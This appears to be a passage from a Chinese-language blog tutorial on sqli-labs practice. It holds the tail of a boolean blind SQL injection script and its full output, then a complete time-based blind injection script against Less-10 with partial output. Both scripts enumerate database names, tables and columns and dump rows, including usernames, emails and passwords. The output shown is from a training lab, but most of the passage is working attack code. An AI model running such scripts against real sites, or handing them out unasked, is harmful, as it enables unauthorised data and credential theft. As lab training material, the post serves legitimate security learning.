class="subst">&#123;col&#125;</span> from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;record&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                                        r = requests.get(url + payload)</span><br><span class="line">                                        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                            value += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                                            <span class="keyword">break</span></span><br><span class="line">                                record_data.append(value)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;record + <span class="number">1</span>&#125;</span>条: <span class="subst">&#123;record_data&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        db_len = db_length()</span><br><span class="line">        current_db = db_name()</span><br><span class="line">        table_count = tb_piece(current_db)</span><br><span class="line">        tables = tb_name(current_db, table_count)</span><br><span class="line">        column_counts = column_num(tables, current_db)</span><br><span class="line">        column_names = column_name(tables, column_counts, current_db)</span><br><span class="line">        dump_data(tables, column_names, current_db)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是脚本运行得到的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">开始测试数据库名长度</span><br><span class="line">数据库长度为：8</span><br><span class="line">开始测试数据库名长度</span><br><span class="line">数据库长度为：8</span><br><span class="line">字符为：s</span><br><span class="line">当前数据库名：s</span><br><span class="line">字符为：e</span><br><span class="line">当前数据库名：se</span><br><span class="line">字符为：c</span><br><span class="line">当前数据库名：sec</span><br><span class="line">字符为：u</span><br><span class="line">当前数据库名：secu</span><br><span class="line">字符为：r</span><br><span class="line">当前数据库名：secur</span><br><span class="line">字符为：i</span><br><span class="line">当前数据库名：securi</span><br><span class="line">字符为：t</span><br><span class="line">当前数据库名：securit</span><br><span class="line">字符为：y</span><br><span class="line">当前数据库名：security</span><br><span class="line">开始测试security数据库中有几张表.....</span><br><span class="line">security数据库总共有4张表</span><br><span class="line">开始猜解表名.....</span><br><span class="line">第1张表名的长度为：6</span><br><span class="line">当前表名: e</span><br><span class="line">当前表名: em</span><br><span class="line">当前表名: ema</span><br><span class="line">当前表名: emai</span><br><span class="line">当前表名: email</span><br><span class="line">当前表名: emails</span><br><span class="line">完成第1张表: emails</span><br><span class="line">第2张表名的长度为：8</span><br><span class="line">当前表名: r</span><br><span class="line">当前表名: re</span><br><span class="line">当前表名: ref</span><br><span class="line">当前表名: refe</span><br><span class="line">当前表名: refer</span><br><span class="line">当前表名: refere</span><br><span class="line">当前表名: referer</span><br><span class="line">当前表名: referers</span><br><span class="line">完成第2张表: referers</span><br><span class="line">第3张表名的长度为：7</span><br><span class="line">当前表名: u</span><br><span class="line">当前表名: ua</span><br><span class="line">当前表名: uag</span><br><span class="line">当前表名: uage</span><br><span class="line">当前表名: uagen</span><br><span class="line">当前表名: uagent</span><br><span class="line">当前表名: uagents</span><br><span class="line">完成第3张表: uagents</span><br><span class="line">第4张表名的长度为：5</span><br><span class="line">当前表名: u</span><br><span class="line">当前表名: us</span><br><span class="line">当前表名: use</span><br><span class="line">当前表名: user</span><br><span class="line">当前表名: users</span><br><span class="line">完成第4张表: users</span><br><span class="line"></span><br><span class="line">security库下的4张表：[&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span><br><span class="line"></span><br><span class="line">开始猜解每张表的字段数.....</span><br><span class="line">[+] emails表有2个字段</span><br><span class="line">[+] referers表有3个字段</span><br><span class="line">[+] uagents表有4个字段</span><br><span class="line">[+] users表有11个字段</span><br><span class="line"></span><br><span class="line">各表字段数：[2, 3, 4, 11]</span><br><span class="line"></span><br><span class="line">开始猜解每张表的字段名.....</span><br><span class="line"></span><br><span class="line">emails表的字段：</span><br><span class="line">id</span><br><span class="line">email_id</span><br><span class="line"></span><br><span class="line">referers表的字段：</span><br><span class="line">id</span><br><span class="line">referer</span><br><span class="line">ip_address</span><br><span class="line"></span><br><span class="line">uagents表的字段：</span><br><span class="line">id</span><br><span class="line">uagent</span><br><span class="line">ip_address</span><br><span class="line">username</span><br><span class="line"></span><br><span class="line">users表的字段：</span><br><span class="line">id</span><br><span class="line">name</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">type</span><br><span class="line">USER</span><br><span class="line">CURRENT_CONNECTIONS</span><br><span class="line">TOTAL_CONNECTIONS</span><br><span class="line">id</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">开始导出security库的数据...</span><br><span class="line"></span><br><span class="line">emails表的数据：</span><br><span class="line">共有8条记录</span><br><span class="line">第1条: [&#x27;1&#x27;, &#x27;Dumb@dhakkan.com&#x27;]</span><br><span class="line">第2条: [&#x27;2&#x27;, &#x27;Angel@iloveu.com&#x27;]</span><br><span class="line">第3条: [&#x27;3&#x27;, &#x27;Dummy@dhakkan.local&#x27;]</span><br><span class="line">第4条: [&#x27;4&#x27;, &#x27;secure@dhakkan.local&#x27;]</span><br><span class="line">第5条: [&#x27;5&#x27;, &#x27;stupid@dhakkan.local&#x27;]</span><br><span class="line">第6条: [&#x27;6&#x27;, &#x27;superman@dhakkan.local&#x27;]</span><br><span class="line">第7条: [&#x27;7&#x27;, &#x27;batman@dhakkan.local&#x27;]</span><br><span class="line">第8条: [&#x27;8&#x27;, &#x27;admin@dhakkan.com&#x27;]</span><br><span class="line"></span><br><span class="line">referers表的数据：</span><br><span class="line">共有0条记录</span><br><span class="line"></span><br><span class="line">uagents表的数据：</span><br><span class="line">共有0条记录</span><br><span class="line"></span><br><span class="line">users表的数据：</span><br><span class="line">共有13条记录</span><br><span class="line">第1条: [&#x27;1&#x27;, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;, &#x27;1&#x27;, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;]</span><br><span class="line">第2条: [&#x27;2&#x27;, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;, &#x27;2&#x27;, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;]</span><br><span class="line">第3条: [&#x27;3&#x27;, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;, &#x27;3&#x27;, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;]</span><br><span class="line">第4条: [&#x27;4&#x27;, &#x27;secure&#x27;, &#x27;crappy&#x27;, &#x27;4&#x27;, &#x27;secure&#x27;, &#x27;crappy&#x27;]</span><br><span class="line">第5条: [&#x27;5&#x27;, &#x27;stupid&#x27;, &#x27;stupidity&#x27;, &#x27;5&#x27;, &#x27;stupid&#x27;, &#x27;stupidity&#x27;]</span><br><span class="line">第6条: [&#x27;6&#x27;, &#x27;superman&#x27;, &#x27;genious&#x27;, &#x27;6&#x27;, &#x27;superman&#x27;, &#x27;genious&#x27;]</span><br><span class="line">第7条: [&#x27;7&#x27;, &#x27;batman&#x27;, &#x27;mob!le&#x27;, &#x27;7&#x27;, &#x27;batman&#x27;, &#x27;mob!le&#x27;]</span><br><span class="line">第8条: [&#x27;8&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;8&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;]</span><br><span class="line">第9条: [&#x27;9&#x27;, &#x27;admin1&#x27;, &#x27;admin1&#x27;, &#x27;9&#x27;, &#x27;admin1&#x27;, &#x27;admin1&#x27;]</span><br><span class="line">第10条: [&#x27;10&#x27;, &#x27;admin2&#x27;, &#x27;admin2&#x27;, &#x27;10&#x27;, &#x27;admin2&#x27;, &#x27;admin2&#x27;]</span><br><span class="line">第11条: [&#x27;11&#x27;, &#x27;admin3&#x27;, &#x27;admin3&#x27;, &#x27;11&#x27;, &#x27;admin3&#x27;, &#x27;admin3&#x27;]</span><br><span class="line">第12条: [&#x27;12&#x27;, &#x27;dhakkan&#x27;, &#x27;dumbo&#x27;, &#x27;12&#x27;, &#x27;dhakkan&#x27;, &#x27;dumbo&#x27;]</span><br><span class="line">第13条: [&#x27;14&#x27;, &#x27;admin4&#x27;, &#x27;admin4&#x27;, &#x27;14&#x27;, &#x27;admin4&#x27;, &#x27;admin4&#x27;]</span><br></pre></td></tr></table></figure><h1 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h1><p>下面是一个比较我认为比较简洁的时间盲注的脚本，本可以根据布尔盲注的脚本简单更改的，但是这种脚本也值得学习，借鉴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://sql/sqli-labs/Less-10/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_len</span>():</span><br><span class="line">    <span class="comment">#获取数据库名称长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        payload = <span class="string">f&#x27;?id=1&quot; and if(length(database())=<span class="subst">&#123;i&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;数据库长度:&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="comment">#获取数据库名称</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># 遍历所有可打印ASCII字符</span></span><br><span class="line">            payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>, name)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;最终数据库名:&#x27;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="comment">#获取所有表名</span></span><br><span class="line">    tables = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            tables.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发现表 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_name</span>):</span><br><span class="line">    <span class="comment">#获取指定表的所有列名</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select distinct column_name from information_schema.columns where table_name=&quot;<span class="subst">&#123;table_name&#125;</span>&quot; and table_schema=database() limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> columns:  <span class="comment">#检验列名是否为真，并且是否不存在与columns列表中，避免重复添加相同的列名</span></span><br><span class="line">            columns.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;表 <span class="subst">&#123;table_name&#125;</span> 的列 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data</span>(<span class="params">column, table</span>):</span><br><span class="line">    <span class="comment">#获取指定表的数据</span></span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            results.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;表 <span class="subst">&#123;table&#125;</span> 的 <span class="subst">&#123;column&#125;</span> 数据 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始SQL盲注测试...&quot;</span>)</span><br><span class="line">    length = database_len()</span><br><span class="line">    <span class="keyword">if</span> length &gt; <span class="number">0</span>:</span><br><span class="line">        db_name = database_name(length)</span><br><span class="line">        tables = table_name()</span><br><span class="line">        <span class="keyword">if</span> tables:</span><br><span class="line">            <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n正在获取表 <span class="subst">&#123;table&#125;</span> 的列信息...&quot;</span>)</span><br><span class="line">                columns = column_name(table)</span><br><span class="line">                <span class="keyword">if</span> columns:</span><br><span class="line">                    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n正在获取表 <span class="subst">&#123;table&#125;</span> 的列 <span class="subst">&#123;column&#125;</span> 的数据...&quot;</span>)</span><br><span class="line">                        data(column, table)</span><br><span class="line">    <span class="comment"># 最后这一段能够体现出对函数的逐层调用的过程</span></span><br></pre></td></tr></table></figure><p>下面是脚本运行的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">开始SQL盲注测试...</span><br><span class="line">数据库长度: 8</span><br><span class="line">当前数据库名: s</span><br><span class="line">当前数据库名: se</span><br><span class="line">当前数据库名: sec</span><br><span class="line">当前数据库名: secu</span><br><span class="line">当前数据库名: secur</span><br><span class="line">当前数据库名: securi</span><br><span class="line">当前数据库名: securit</span><br><span class="line">当前数据库名: security</span><br><span class="line">最终数据库名: security</span><br><span class="line">发现表 1: emails</span><br><span class="line">发现表 2: referers</span><br><span class="line">发现表 3: uagents</span><br><span class="line">发现表 4: users</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列信息...</span><br><span class="line">表 emails 的列 1: id</span><br><span class="line">表 emails 的列 2: email_id</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列 id 的数据...</span><br><span class="line">表 emails 的 id 数据 1: 1</span><br><span class="line">表 emails 的 id 数据 2: 2</span><br><span class="line">表 emails 的 id 数据 3: 3</span><br><span class="line">表 emails 的 id 数据 4: 4</span><br><span class="line">表 emails 的 id 数据 5: 5</span><br><span class="line">表 emails 的 id 数据 6: 6</span><br><span class="line">表 emails 的 id 数据 7: 7</span><br><span class="line">表 emails 的 id 数据 8: 8</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列 email_id 的数据...</span><br><span class="line">表 emails 的 email_id 数据 1: Dumb@dhakkan.com</span><br><span class="line">表 emails 的 email_id 数据 2: Angel@iloveu.com</span><br><span class="line">表 emails 的 email_id 数据 3: Dummy@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 4: secure@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 5: stupid@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 6: superman@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 7: batman@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 8: admin@dhakkan.com</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列信息...</span><br><span class="line">表 referers 的列 1: id</span><br><span class="line">表 referers 的列 2: referer</span><br><span class="line">表 referers 的列 3: ip_address</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 id 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 referer 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 ip_address 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列信息...</span><br><span class="line">表 uagents 的列 1: id</span><br><span class="line">表 uagents 的列 2: uagent</span><br><span class="line">表 uagents 的列 3: ip_address</span><br><span class="line">表 uagents 的列 4: username</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 id 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 uagent 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 ip_address 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 username 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列信息...</span><br><span class="line">表 users 的列 1: id</span><br><span class="line">表 users 的列 2: username</span><br><span class="line">表 users 的列 3: password</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 id 的数据...</span><br><span class="line">表 users 的 id 数据 1: 1</span><br><span class="line">表 users 的 id 数据 2: 2</span><br><span class="line">表 users 的 id 数据 3: 3</span><br><span class="line">表 users 的 id 数据 4: 4</span><br><span class="line">表 users 的 id 数据 5: 5</span><br><span class="line">表 users 的 id 数据 6: 6</span><br><span class="line">表 users 的 id 数据 7: 7</span><br><span class="line">表 users 的 id 数据 8: 8</span><br><span class="line">表 users 的 id 数据 9: 9</span><br><span class="line">表 